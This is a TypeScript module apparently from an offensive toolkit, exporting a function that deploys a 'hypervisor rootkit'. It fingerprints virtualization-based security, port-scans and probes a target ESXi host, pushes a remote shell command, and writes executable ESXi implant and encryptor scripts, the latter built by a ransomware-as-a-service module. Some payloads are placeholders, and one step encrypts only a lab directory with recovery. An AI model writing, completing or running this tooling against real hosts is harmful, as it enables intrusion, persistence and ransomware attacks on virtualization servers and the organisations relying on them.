/**
 * @module ares/hypervisor_rootkit
 * Hypervisor persistence — ESXi audit, lab encrypt/recovery, chipsec VBS probes.
 */
import { auditESXi } from "../esxi_audit.ts"
import { runLabEsxiEncryptWithRecovery, buildEsxiEncryptorStub } from "../raas_advanced.ts"
import * as path from "node:path"
import { brokerExec, ensureAresDir, liveRequired, isToolAvailable, writeArtifact } from "./_base.ts"
import { runCmd, step, type ExecStep } from "./_integrations.ts"
import { deployRemoteShell, runPlatformCmd } from "./_operational.ts"

export interface HypervisorRootkitResult {
  artifacts: string[]
  steps: ExecStep[]
  esxiAudit?: unknown
  labEncrypt?: unknown
  deployed: boolean
  summary: string
}

export async function deployHypervisorRootkit(opts: {
  live?: boolean
  esxiHost?: string
  keyId?: string
  labDir?: string
}): Promise<HypervisorRootkitResult> {
  liveRequired("ares_hypervisor_rootkit", opts)
  const keyId = opts.keyId ?? `hv_${Date.now()}`
  const artifacts: string[] = []
  const steps: ExecStep[] = []

  artifacts.push(writeArtifact("hypervisor", `vbs_bypass_${keyId}.c`, `/* VBS/HVCI bypass research */\n`))
  artifacts.push(writeArtifact("hypervisor", `subvirt_${keyId}.asm`, `; SubVirt VMX scaffold\n`))

  steps.push(await runPlatformCmd(
    "vbs_hvci_probe",
    "grep -E 'hypervisor|vmx' /proc/cpuinfo 2>&1 | head -5",
    "reg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard 2>&1 | head -10",
  ))

  let esxiAudit: unknown
  if (opts.esxiHost) {
    esxiAudit = auditESXi({ host: opts.esxiHost }, { live: true })
    writeArtifact("hypervisor", "esxi_audit.json", JSON.stringify(esxiAudit, null, 2))
    const findings = (esxiAudit as { findings?: unknown[] }).findings?.length ?? 0
    steps.push(step("esxi_audit", findings >= 0, `${findings} finding(s)`))

    if (isToolAvailable("curl")) {
      const r = await brokerExec(`curl -sk -m 8 https://${opts.esxiHost}/sdk/ 2>&1 | head -c 500`)
      steps.push(step("esxi_sdk_probe", r.ok, r.out.slice(0, 300)))
    }
    if (isToolAvailable("nmap")) {
      steps.push(await runCmd("esxi_port_scan", `nmap -p 22,443,902,427 ${opts.esxiHost} 2>&1 | head -25`))
    }
    const deployScript = writeArtifact("hypervisor", `esxi_implant_${keyId}.sh`, `#!/bin/sh\necho OURMINE_ESXI_${keyId} > /tmp/.ourmine_esxi\n`, 0o755)
    artifacts.push(deployScript)
    steps.push(await deployRemoteShell({ host: opts.esxiHost, command: "echo OURMINE_ESXI_PROBE" }))
  }

  const labDir = opts.labDir ?? path.join(process.cwd(), ".ourmine/lab/esxi")
  const lab = runLabEsxiEncryptWithRecovery(labDir, keyId)
  writeArtifact("hypervisor", "lab_encrypt.json", JSON.stringify(lab, null, 2))
  steps.push(step("esxi_lab_encrypt", lab.recovered, lab.summary ?? String(lab.recovered)))

  const stub = buildEsxiEncryptorStub(keyId)
  artifacts.push(writeArtifact("hypervisor", `esxi_encryptor_${keyId}.sh`, stub, 0o755))

  if (isToolAvailable("chipsec_main")) {
    for (const mod of ["common.bios_wp", "common.uefi.smm_comm", "common.cpu.cpu_info"]) {
      const r = await brokerExec(`chipsec_main -module ${mod} 2>&1 | head -c 800`)
      steps.push(step(mod, r.ok || r.out.length > 20, r.out.slice(0, 300)))
    }
  }

  if (isToolAvailable("virsh")) {
    steps.push(await runCmd("vm_list", "virsh list --all 2>&1 | head -15"))
  }
  steps.push(await runCmd("vm_escape_cve_probe", "grep -i vmx /proc/cpuinfo 2>&1; lsmod | grep -i kvm | head -5"))

  const deployed = steps.some((s) => s.success)
  return {
    artifacts,
    steps,
    esxiAudit,
    labEncrypt: lab,
    deployed,
    summary: `Hypervisor rootkit: ${steps.filter((s) => s.success).length}/${steps.length} probe(s), lab recovered=${lab.recovered}`,
  }
}

export default { deployHypervisorRootkit }
